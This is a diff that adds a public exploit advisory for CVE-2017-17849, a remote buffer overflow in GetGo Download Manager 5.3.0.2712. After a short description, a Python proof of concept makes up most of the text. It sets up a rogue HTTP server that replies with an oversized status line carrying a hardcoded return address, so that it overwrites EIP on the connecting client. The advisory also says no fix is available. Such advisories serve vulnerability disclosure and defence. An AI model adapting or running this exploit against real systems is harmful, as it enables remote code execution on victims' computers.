@@ -1,0 +1,57 @@
+# Exploit Title: Buffer overflow vulnerability in GetGo Download Manager 5.3.0.2712
+# CVE: CVE-2017-17849
+# Date: 22-12-2017
+# Tested on Windows 10 32 bits 
+# Exploit Author: Aloyce J. Makalanga
+# Contact: https://twitter.com/aloycemjr
+# Software Link: http://www.getgosoft.com/getgodm/ 
+# Category: webapps
+# Attack Type: Remote
+# Impact: Code Execution 
+
+
+ 
+1. Description
+
+A buffer overflow vulnerability in GetGo Download Manager 5.3.0.2712 and earlier could allow remote HTTP servers to execute arbitrary code on NAS devices via a long response. To exploit this vulnerability, an attacker needs to issue a malicious-crafted payload in the HTTP Response Header. A successful attack could result in code execution on the victim computer. 
+
+   
+2. Proof of Concept
+
+ 
+
+def main():
+    host = "192.168.205.128"
+    port = 80
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((host, port))
+    s.listen(1)
+    print "\n[+] Listening on %d ..." % port
+
+    cl, addr = s.accept()
+    print "[+] Connection accepted from %s" % addr[0]
+
+    evilbuffer = "A" * 4105
+    hardCodedEIP= "\x69\x9E\x45\x76" #This is a hardcoded EIP just for demo . As you can see on the screenshot, we hit a breakpoint, right here on this EIP. Do you see our stack!!! You need to change this. 
+    pads  = "C"*(6000 - len(evilbuffer + hardCodedEIP))
+    payload = evilbuffer + hardCodedEIP + pads
+
+    buffer = "HTTP/1.1 200 " + payload + "\r\n"
+
+    print cl.recv(1000)
+    cl.send(buffer)
+    print "[+] Sending buffer: OK\n"
+
+    sleep(3)
+    cl.close()
+    s.close()
+
+if __name__ == '__main__':
+    import socket
+    from time import sleep
+    main()
+
+3. Solution:
+
+   No solution as of yet.
